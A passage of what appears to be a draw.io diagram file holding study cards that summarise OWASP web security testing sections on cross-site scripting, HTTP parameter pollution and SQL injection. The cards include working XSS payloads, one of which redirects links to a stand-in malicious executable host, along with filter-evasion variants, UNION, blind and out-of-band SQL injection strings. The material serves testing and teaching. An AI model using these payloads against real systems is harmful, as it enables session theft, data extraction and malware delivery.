style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;amp;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&quot;&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\n&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\r&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\uXXXX&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/index.php?user=&lt;b style=&quot;&quot;&gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/index.php?user=&lt;b style=&quot;&quot;&gt;&amp;lt;script&amp;gt;window.onload = function() {var AllLinks=document.getElementsByTagName(&quot;a&quot;);AllLinks[0].href = &quot;http://badexample.com/malicious.exe&quot;;}&amp;lt;/script&amp;gt;&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;&lt;b style=&quot;&quot;&gt;&quot; onfocus=&quot;alert(document.cookie)&lt;/b&gt;&quot;&amp;gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&quot;&amp;gt;&amp;lt;&lt;b&gt;S&lt;/b&gt;c&lt;b&gt;R&lt;/b&gt;i&lt;b&gt;P&lt;/b&gt;t&amp;gt;alert(document.cookie)&amp;lt;/&lt;b&gt;S&lt;/b&gt;c&lt;b&gt;R&lt;/b&gt;i&lt;b&gt;P&lt;/b&gt;t&amp;gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&quot;&lt;b&gt;%3c&lt;/b&gt;script&lt;b&gt;%3e&lt;/b&gt;alert(document.cookie)&lt;b&gt;%3c&lt;/b&gt;/script&lt;b&gt;%3e&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b&gt;&amp;lt;scr&lt;/b&gt;&amp;lt;script&amp;gt;&lt;b&gt;ipt&amp;gt;&lt;/b&gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/i&gt;&lt;/p&gt;&lt;div&gt;&lt;div&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example/page.php?param=&amp;lt;script&lt;b&gt;&amp;amp;param=&lt;/b&gt;&amp;gt;[...]&amp;lt;/&amp;amp;param=script&amp;gt;&lt;/i&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://cybersecurity.wtf/encoder/&quot;&gt;CyberChef Charset Encoder&lt;/a&gt;, &lt;a href=&quot;https://hackvertor.co.uk/public&quot;&gt;Hackvertor&lt;/a&gt;, &lt;a href=&quot;http://xss-proxy.sourceforge.net/&quot;&gt;XSS-Proxy&lt;/a&gt;, &lt;a href=&quot;https://code.google.com/archive/p/ratproxy/&quot;&gt;ratproxy&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/burp/&quot;&gt;Burp Proxy&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-community/xss-filter-evasion-cheatsheet&quot;&gt;OWASP&amp;nbsp;XSS Filter Evasion Cheat Sheet&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="920" width="400" x="2440" y="80" as="geometry" />
        </mxCell>
        <mxCell id="IHEKWDrpAqfZmFJUPOx4-5" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;whiteSpace=wrap;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-02&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Stored Cross Site Scripting&lt;/h1&gt;&lt;p&gt;Stored Cross-site Scripting (XSS) occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use.&lt;/p&gt;&lt;p&gt;Stored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify stored input that is reflected on the client-side.&lt;/li&gt;&lt;li&gt;Assess the input they accept and the encoding that gets applied on return (if any).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;identify all points where user input is stored into the back-end and then displayed by the application:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;User/Profiles page&lt;/b&gt;: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;Shopping cart&lt;/b&gt;: the application allows the user to store items into the shopping cart which can then be reviewed later&lt;/li&gt;&lt;li&gt;&lt;b&gt;File Manager&lt;/b&gt;: application that allows upload of files&lt;/li&gt;&lt;li&gt;&lt;b&gt;Application settings/preferences&lt;/b&gt;: application that allows the user to set preferences&lt;/li&gt;&lt;li&gt;&lt;b&gt;Forum/Message board&lt;/b&gt;: application that permits exchange of posts among users&lt;/li&gt;&lt;li&gt;&lt;b&gt;Blog&lt;/b&gt;: if the blog application permits to users submitting comments&lt;/li&gt;&lt;li&gt;&lt;b&gt;Log&lt;/b&gt;: if the application stores some users input into logs.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Fundamental to understand if input is stored and how it is positioned in the context of the page.&lt;/p&gt;&lt;p&gt;All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;aaa@aa.com&lt;b&gt;&amp;amp;quot;&amp;amp;gt;&amp;amp;lt;script&amp;amp;gt;alert(&quot;P W N D&quot;)&amp;amp;lt;/script&amp;amp;gt;&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;aaa@aa.com&lt;b&gt;%22%3E%3Cscript%3Ealert(&quot;P W N D&quot;)%3C%2Fscript%3E&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Verify if the file upload allows setting arbitrary MIME types.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;&lt;br&gt;Content-Type: &lt;b&gt;text/html&lt;/b&gt;&lt;br&gt;&lt;b&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Check how user input is processed by the application and then stored into the back-end system:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Use front-end application and enter input with special/invalid characters;&lt;/li&gt;&lt;li&gt;Analyze application response(s);&lt;/li&gt;&lt;li&gt;Identify presence of input validation controls;&lt;/li&gt;&lt;li&gt;Access back-end system and check if input is stored and how it is stored;&lt;/li&gt;&lt;li&gt;Analyze source code and understand how stored input is rendered by the application.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Tools:&amp;nbsp;&lt;a href=&quot;https://cybersecurity.wtf/encoder/&quot; style=&quot;background-color: transparent;&quot;&gt;CyberChef Charset Encoder&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;a href=&quot;https://hackvertor.co.uk/public&quot; style=&quot;background-color: transparent;&quot;&gt;Hackvertor&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;a href=&quot;http://xss-proxy.sourceforge.net/&quot; style=&quot;background-color: transparent;&quot;&gt;XSS-Proxy&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;a href=&quot;https://code.google.com/archive/p/ratproxy/&quot; style=&quot;background-color: transparent;&quot;&gt;ratproxy&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;a href=&quot;https://portswigger.net/burp/&quot; style=&quot;background-color: transparent;&quot;&gt;Burp Proxy&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;a href=&quot;https://www.zaproxy.org/&quot; style=&quot;background-color: transparent;&quot;&gt;OWASP ZAP&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;, &lt;a href=&quot;https://www.beefproject.com/&quot;&gt;BeEF&lt;/a&gt;, &lt;a href=&quot;https://www.greasespot.net/&quot;&gt;XSS Assistant&lt;/a&gt;,&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;a href=&quot;https://owasp.org/www-community/xss-filter-evasion-cheatsheet&quot; style=&quot;background-color: transparent;&quot;&gt;OWASP&amp;nbsp;XSS Filter Evasion Cheat Sheet&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="1020" width="400" x="2440" y="1000" as="geometry" />
        </mxCell>
        <mxCell id="Lb8i1lB9SGqQkc6jYnQ9-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-03&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for HTTP Verb Tampering&lt;/h1&gt;&lt;p&gt;Merged into &lt;b&gt;WSTG-CONF-06&lt;/b&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="120" width="400" x="2440" y="2020" as="geometry" />
        </mxCell>
        <mxCell id="Lb8i1lB9SGqQkc6jYnQ9-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-04&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for HTTP Parameter Pollution&lt;/h1&gt;&lt;p&gt;HTTP Parameter Pollution (HPP) tests the applications response to receiving multiple HTTP parameters with the same name (attacker may be able to bypass input validation, trigger application errors or modify internal variables values).&lt;/p&gt;&lt;p&gt;Current HTTP standards do not include guidance on how to interpret multiple input parameters with the same name.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify the backend and the parsing method used.&lt;/li&gt;&lt;li&gt;Assess injection points and try bypassing input filters using HPP.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;Identify any form or action that allows user-supplied input.&lt;/p&gt;&lt;p&gt;Append the same parameter to the GET or POST data but with a different value assigned.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/?m=f&lt;b style=&quot;&quot;&gt;&amp;amp;search=kittens&lt;/b&gt;&amp;amp;num=100&lt;b style=&quot;&quot;&gt;&amp;amp;search=puppies&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Analyze the response page to determine which value(s) were parsed (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;kittens,puppies&lt;/i&gt; or &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;kittens~puppies&lt;/i&gt; or &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;[&#39;kittens&#39;,&#39;puppies&#39;]&lt;/i&gt;).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Potential vulnerability depends on the specific input validation and filtering specific to a particular application.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/?&lt;b&gt;par1&lt;/b&gt;=val1&lt;br&gt;http://example.com/?&lt;b&gt;par1&lt;/b&gt;=HPP_TEST1&lt;br&gt;http://example.com/?&lt;b&gt;par1&lt;/b&gt;=val1&amp;amp;&lt;b&gt;par1&lt;/b&gt;=HPP_TEST1&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;While in the &lt;b&gt;server-side&lt;/b&gt; variant the attacker leverages a vulnerable web application to access protected data or to perform actions that either not permitted or not supposed to be executed, &lt;b&gt;client-side&lt;/b&gt; attacks aim at subverting client-side components and technologies.&lt;br&gt;&lt;/p&gt;&lt;p&gt;To test for HPP client-side vulnerabilities, identify any form or action that allows user input and shows a result of that input back to the user.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Pay attention to responses having HPP vectors within data, src, href attributes or forms actions.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Pollute each HTTP parameter with urlencoded payload (&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i&gt;&lt;b&gt;%26&lt;/b&gt;HPP_TEST&lt;/i&gt;&lt;/span&gt;) and&amp;nbsp;look for url-decoded occurrences (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b&gt;&amp;amp;&lt;/b&gt;HPP_TEST&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b&gt;&amp;amp;amp;&lt;/b&gt;HPP_TEST&lt;/i&gt;).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://capec.mitre.org/data/definitions/460.html&quot;&gt;CAPEC-460&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="740" width="400" x="2440" y="2140" as="geometry" />
        </mxCell>
        <mxCell id="cbV7kH68FjEWk7K_4w8G-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-05&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for SQL Injection&lt;/h1&gt;&lt;p&gt;An SQL injection attack consists of insertion or “injection” of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application to read/modify/delete sensitive data, execute administration operations on the database, etc.&lt;/p&gt;&lt;p&gt;SQL Injection attacks can be divided into the following three classes:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Inband&lt;/b&gt;: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Out-of-band&lt;/b&gt;: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).&lt;/li&gt;&lt;li&gt;&lt;b&gt;Inferential or Blind&lt;/b&gt;: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Techniques to exploit SQL injection flaws:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Union Operator&lt;/b&gt;: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Boolean&lt;/b&gt;: use Boolean condition(s) to verify whether certain conditions are true or false.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Error based&lt;/b&gt;: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Out-of-band&lt;/b&gt;: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).&lt;/li&gt;&lt;li&gt;&lt;b&gt;Time delay&lt;/b&gt;: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify SQL injection points.&lt;/li&gt;&lt;li&gt;Assess the severity of the injection and the level of access that can be achieved through it.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;Understand when the application interacts with a DB Server in order to access some data (Authentication forms, Search engines, E-Commerce sites).&lt;/p&gt;&lt;p&gt;Make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.&lt;/p&gt;&lt;p&gt;Try to add &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39;&lt;/i&gt;&amp;nbsp;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;--&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/* &amp;lt;...&amp;gt; */&lt;/i&gt; or &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;;&lt;/i&gt;&amp;nbsp;to the field or parameter under test&lt;/p&gt;&lt;p&gt;Monitor all the responses from the web server and have a look at the HTML/JavaScript source code.&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SELECT * FROM Users WHERE Username=&#39;&lt;b style=&quot;&quot;&gt;1&#39; OR &#39;1&#39; = &#39;1&lt;/b&gt;&#39; AND Password=&#39;&lt;b style=&quot;&quot;&gt;1&#39; OR &#39;1&#39; = &#39;1&lt;/b&gt;&#39;&lt;br&gt;&lt;/i&gt;&lt;i&gt;SELECT * FROM Users WHERE ((Username=&#39;&lt;b style=&quot;&quot;&gt;1&#39; or &#39;1&#39; = &#39;1&#39;)&lt;span style=&quot;background-color: light-dark(#ffffff, var(--ge-dark-color, #121212));&quot;&gt;)&amp;nbsp;&lt;/span&gt;&lt;/b&gt;&lt;/i&gt;&lt;span style=&quot;background-color: light-dark(#ffffff, var(--ge-dark-color, #121212));&quot;&gt;&lt;b style=&quot;&quot;&gt;&lt;i&gt;&lt;u&gt;LIMIT 1&lt;/u&gt;&amp;nbsp;&lt;/i&gt;&lt;/b&gt;&lt;i style=&quot;&quot;&gt;&lt;b style=&quot;&quot;&gt;/*&lt;/b&gt;&#39;) A&lt;/i&gt;&lt;/span&gt;&lt;i style=&quot;&quot;&gt;ND (Password=MD5(&#39;&lt;b&gt;foo&lt;/b&gt;&#39;)))&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;A good way to test if the application is vulnerable in this scenario is play with logic, using the operators AND and OR:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10 &lt;b&gt;AND 1=2&lt;/b&gt;&lt;/i&gt; -&amp;gt; Error&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10 &lt;b&gt;AND 1=1&lt;/b&gt;&lt;/i&gt; -&amp;gt; Ok&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10&lt;b&gt;; INSERT INTO users &amp;lt;…&amp;gt;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Check error messages to fingerprint DBMS for further attacks.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SELECT Name, Phone, Address FROM Users WHERE Id=1 &lt;b&gt;UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;To use UNION attack you should know the number of columns.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10 &lt;b&gt;ORDER BY 10--&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Then you need to find out the type of columns.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10 &lt;b&gt;UNION SELECT 1,&lt;u&gt;null,null&lt;/u&gt;--&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Try&amp;nbsp;pseudo-functions to find out the first character and, when we have discovered the value, we will pass to the second and so on, until we will have discovered the entire value:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SUBSTRING (text, start, length)&lt;/i&gt;;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;ASCII (char)&lt;/i&gt;;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;LENGTH (text)&lt;/i&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SELECT field1, field2, field3 FROM Users WHERE Id=&#39;1&#39; &lt;b&gt;AND ASCII(SUBSTRING(username,1,1))=97 AND &#39;1&#39;=&#39;1&#39;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SELECT field1, field2, field3 FROM Users WHERE Id=&#39;1&#39; &lt;b&gt;AND LENGTH(username)=N AND &#39;1&#39; = &#39;1&#39;&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10&lt;b&gt;||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--&lt;/b&gt;&lt;/i&gt;&lt;span&gt; -&amp;gt;&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;ORA-292257: host SCOTT unknown&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10&lt;b&gt;||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--&lt;/b&gt;&lt;/i&gt; -&amp;gt;&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;GET /SCOTT HTTP/1.1&amp;nbsp;Host: testerserver.com&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/product.php?id=10 &lt;b&gt;AND IF(version() like ‘5%’, sleep(10), ‘false’))--&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;or &#39;a&#39;=&#39;a&#39;&lt;br&gt;or &#39;a&#39;&amp;nbsp; =&amp;nbsp; &amp;nbsp; &#39;a&#39;&lt;/i&gt;&lt;/p&gt;&lt;div&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b&gt;%00&lt;/b&gt;&#39; UNION SELECT password FROM Users WHERE username=&#39;admin&#39;--&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39;&lt;b&gt;/* */&lt;/b&gt;UNION&lt;b&gt;/* */&lt;/b&gt;SELECT&lt;b&gt;/* */&lt;/b&gt;password&lt;b&gt;/* */&lt;/b&gt;FROM&lt;b&gt;/* */&lt;/b&gt;Users&lt;b&gt;/* */&lt;/b&gt;WHERE&lt;b&gt;/* */&lt;/b&gt;name&lt;b&gt;/* */&lt;/b&gt;LIKE&lt;b&gt;/* */&lt;/b&gt;&#39;admin&#39;--&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39;&lt;b&gt;/* */&lt;/b&gt;UNI&lt;b&gt;/* */&lt;/b&gt;ON&lt;b&gt;/* */&lt;/b&gt;SE&lt;b&gt;/* */&lt;/b&gt;LECT&lt;b&gt;/* */&lt;/b&gt;password&lt;b&gt;/* */&lt;/b&gt;FROM&lt;b&gt;/* */&lt;/b&gt;Users&lt;b&gt;/* */&lt;/b&gt;WHE&lt;b&gt;/* */&lt;/b&gt;RE&lt;b&gt;/* */&lt;/b&gt;name&lt;b&gt;/* */&lt;/b&gt;LIKE&lt;b&gt;/* */&lt;/b&gt;&#39;admin&#39;--&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b&gt;%27&lt;/b&gt; &lt;b&gt;%20&lt;/b&gt;UNION &lt;b&gt;%20&lt;/b&gt;SELECT &lt;b&gt;%20&lt;/b&gt;password &lt;b&gt;%20&lt;/b&gt;FROM &lt;b&gt;%20&lt;/b&gt;Users &lt;b&gt;%20&lt;/b&gt;WHERE &lt;b&gt;%20&lt;/b&gt;name &lt;b&gt;%3D&lt;/b&gt; &lt;b&gt;%27&lt;/b&gt;admin &lt;b&gt;%27&lt;/b&gt;--&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39; UNION SELECT password FROM Users WHERE name = &lt;b&gt;char(114,111,111,116)--&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b&gt;EXEC&lt;/b&gt;(&#39;SEL&#39; + &#39;ECT 1&#39;)&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Select user from users where name = &lt;b&gt;726F6F74&lt;/b&gt;&lt;br&gt;Select user from users where name = &lt;b&gt;unhex(&#39;726F6F74&#39;)&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Specific Testing Guides for different DBMSs: &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle&quot;&gt;Oracle&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL&quot;&gt;MySQL&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server&quot;&gt;MS SQL&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL&quot;&gt;PostgreSQL&lt;/a&gt;, &lt;a 